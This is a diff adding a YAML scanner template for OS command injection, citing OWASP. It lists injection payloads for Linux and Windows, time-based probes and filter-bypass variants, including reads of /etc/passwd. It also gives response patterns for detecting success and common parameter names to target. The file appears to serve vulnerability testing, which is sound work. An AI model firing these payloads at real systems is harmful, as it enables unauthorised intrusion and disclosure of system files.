@@ -1,0 +1,60 @@
+meta:
+  name: 'OS Command Injection'
+  version: '1.0'
+  extends: 'base.yaml'
+  severity: 'High'
+  reference: 'OWASP A03:2021'
+
+# 탐지 설정
+detection:
+  # 서버 응답에서 해당 문자열 찾기
+  success_patterns:
+    - 'uid='
+    - 'root:'
+    - 'windows nt'
+    - 'microsoft windows'
+    - 'volume serial number'
+    - 'drwx'
+
+  time_based_threshold: 5
+
+payloads:
+  linux:
+    - '; id'
+    - '| id'
+    - '& id'
+    - '`id`'
+    - '$(id)'
+    - '; whoami'
+    - '; cat /etc/passwd'
+    - '|| id'
+
+  windows:
+    - '& whoami'
+    - '| whoami'
+    - '; whoami'
+    - '& ver'
+    - '| dir'
+
+  time_based:
+    - '; sleep 5'
+    - '| sleep 5'
+    - '& timeout 5'
+    - '; ping -c 5 127.0.0.1'
+
+  bypass:
+    - ';$IFS$()id'
+    - ';{id}'
+    - '|{cat,/etc/passwd}'
+    - ";i''d"
+
+target_params:
+  - 'cmd'
+  - 'exec'
+  - 'command'
+  - 'ping'
+  - 'host'
+  - 'ip'
+  - 'url'
+  - 'filename'
+  - 'file'
